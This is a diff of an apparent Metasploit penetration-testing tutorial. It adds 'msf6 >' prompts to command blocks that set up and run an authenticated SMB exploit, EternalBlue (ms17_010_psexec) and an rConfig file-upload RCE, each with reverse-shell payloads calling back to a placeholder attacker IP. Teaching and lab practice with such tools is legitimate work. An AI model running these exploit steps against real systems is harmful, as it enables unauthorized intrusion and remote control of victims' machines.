@@ -101,36 +101,36 @@ sudo msfconsole
 Searching Within Metasploit  
 
 ```bash
-search smb
+msf6 > search smb
 ```
 
 Selecting an Exploit  
 
 ```bash
-use 56
+msf6 > use 56
 ```
 
 Examining an Exploit's Options  
 
 ```bash
-options
+msf6 > options
 ```
 
 Setting Options  
 
 ```bash
-set RHOSTS <TARGET IP>
-set SMBUser <USER>
-set SMBPass <PASSWORD>
-set LHOST <ATTACKER IP>
-set LPORT <ATTACKER PORT>
-set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 > set RHOSTS <TARGET IP>
+msf6 > set SMBUser <USER>
+msf6 > set SMBPass <PASSWORD>
+msf6 > set LHOST <ATTACKER IP>
+msf6 > set LPORT <ATTACKER PORT>
+msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
 Exploits Away  
 
 ```bash
-run
+msf6 > run
 
 # [*] Meterpreter session 1 opened (<ATTACKER IP>:<ATTACKER PORT> -> <TARGET IP>:<TARGET PORT>) at 2025-06-20 10:56:44 -0500
 
@@ -264,10 +264,10 @@ msfconsole
 **Attack Machine: Determine if the targert is vulnerable** 
 
 ```bash
-use auxiliary/scanner/smb/smb_ms17_010 
-show options
-set RHOSTS <TARGET IP>
-run
+msf6 > use auxiliary/scanner/smb/smb_ms17_010 
+msf6 > show options
+msf6 > set RHOSTS <TARGET IP>
+msf6 > run
 ```
 
 Expected output  
@@ -285,11 +285,11 @@ Now, we can see from the check results that our target is likely vulnerable to E
 **Attack Machine: Choose & Configure Our Exploit & Payload**
 
 ```bash
-search eternal
-use exploit/windows/smb/ms17_010_psexec
-options
-set LHOST <ATTACKER IP>
-set RHOSTS <TARGET IP>
+msf6 > search eternal
+msf6 > use exploit/windows/smb/ms17_010_psexec
+msf6 > options
+msf6 > set LHOST <ATTACKER IP>
+msf6 > set RHOSTS <TARGET IP>
 ```
 
 Since I have had more luck with the psexec version of this exploit, we will try that one first. Let's choose it and continue the setup.
@@ -298,7 +298,7 @@ This time, we kept it simple and just used a windows/meterpreter/reverse_tcp pay
 **Attack Machine: Execute Our Attack**  
 
 ```bash
-run
+msf6 > run
 ```
 
 Expected output  
@@ -433,21 +433,21 @@ msfconsole
 **Attack Machine: Determine an Exploit Path**  
 
 ```bash
-search rconfig
-use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+msf6 > search rconfig
+msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
 ```
 
 **Attack Machine: Configure Exploit Options**  
 
 ```bash
-options
-set RHOSTS <TARGET IP>
-set LHOST <ATTACKER IP>
+msf6 > options
+msf6 > set RHOSTS <TARGET IP>
+msf6 > set LHOST <ATTACKER IP>
 ```
 
 **Attack Machine: Execute the Exploit**  
 ```bash
-exploit
+msf6 > exploit
 ```
 
 **Attack Machine: Interact With the Shell**  
